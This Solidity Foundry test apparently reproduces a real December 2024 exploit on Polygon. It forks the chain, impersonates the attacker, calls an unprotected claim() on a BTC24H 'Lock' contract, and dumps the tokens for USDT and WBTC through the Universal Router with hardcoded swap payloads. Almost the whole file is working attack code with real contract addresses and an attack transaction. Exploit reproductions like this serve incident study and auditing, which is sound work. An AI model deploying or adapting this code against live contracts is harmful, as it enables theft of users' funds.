// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 4,953 USDT + 0.76 WBTC ($85.7K)
// Attacker : https://polygonscan.com/address/0xde0a99fb39e78efd3529e31d78434f7645601163
// Attack Contract : https://polygonscan.com/address/0x3cb2452c615007b9ef94d5814765eb48b71ae520
// Vulnerable Contract : https://polygonscan.com/address/0x968e1c984a431f3d0299563f15d48c395f70f719
// Attack Tx : https://polygonscan.com/tx/0x554c9e4067e3bc0201ba06fc2cfeeacd178d7dd9c69f9b211bc661bb11296fde

// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0x968e1c984a431f3d0299563f15d48c395f70f719#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1868845296945426760
// Hacking God : N/A

address constant LOCK = 0x968e1c984A431F3D0299563F15d48C395f70F719;
address constant UNIVERSAL_ROUTER = 0xec7BE89e9d109e7e3Fec59c222CF297125FEFda2;

address constant USDT_ADDR = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
address constant WBTC = 0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6;
address constant BTC24H_TOKEN = 0xea4b5C48a664501691B2ECB407938ee92D389a6f;

contract BTC24H_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 65_560_669 - 1;

    function setUp() public {
        vm.createSelectFork("polygon", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = WBTC;

        vm.label(LOCK, "Lock");
        vm.label(UNIVERSAL_ROUTER, "UniversalRouter");

        vm.label(USDT_ADDR, "USDT");
        vm.label(WBTC, "WBTC");
        vm.label(BTC24H_TOKEN, "BTC24H");
    }

    function testExploit() public {
        address attacker = 0xDE0A99Fb39E78eFd3529e31D78434f7645601163;
        emit log_named_decimal_uint("[Before] USDT", TokenHelper.getTokenBalance(USDT_ADDR, attacker), 6);
        emit log_named_decimal_uint("[Before] WBTC", TokenHelper.getTokenBalance(WBTC, attacker), 8);

        vm.startPrank(attacker);
        AttackContract attackContract = new AttackContract();
        attackContract.start();
        vm.stopPrank();

        emit log_named_decimal_uint("[After] USDT", TokenHelper.getTokenBalance(USDT_ADDR, attacker), 6);
        emit log_named_decimal_uint("[After] WBTC", TokenHelper.getTokenBalance(WBTC, attacker), 8);
    }

    receive() external payable {}
}

contract AttackContract {
    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    function start() public {
        // uint256 btc24hBalance = TokenHelper.getTokenBalance(BTC24H_TOKEN, LOCK); // 110000000000000000000000

        ILock(LOCK).claim();
        TokenHelper.transferToken(BTC24H_TOKEN, UNIVERSAL_ROUTER, 10_000_000_000_000_000_000_000);

        bytes[] memory inputs = new bytes[](1);
        inputs[0] =
            hex"000000000000000000000000de0a99fb39e78efd3529e31d78434f764560116300000000000000000000000000000000000000000000021e19e0c9bab2400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002bea4b5c48a664501691b2ecb407938ee92d389a6f002710c2132d05d31c914a87c6611c10748aeb04b58e8f000000000000000000000000000000000000000000";
        IUniversalRouter(UNIVERSAL_ROUTER).execute(hex"00", inputs, block.timestamp + 1 hours);

        TokenHelper.transferToken(BTC24H_TOKEN, UNIVERSAL_ROUTER, 100_000_000_000_000_000_000_000);
        inputs[0] =
            hex"000000000000000000000000de0a99fb39e78efd3529e31d78434f764560116300000000000000000000000000000000000000000000152d02c7e14af6800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002bea4b5c48a664501691b2ecb407938ee92d389a6f0027101bfd67037b42cf73acf2047067bd4f2c47d9bfd6000000000000000000000000000000000000000000";
        IUniversalRouter(UNIVERSAL_ROUTER).execute(hex"00", inputs, block.timestamp + 1 hours);
    }

    receive() external payable {}
}

interface ILock {
    function claim() external;
}

interface IUniversalRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;
}
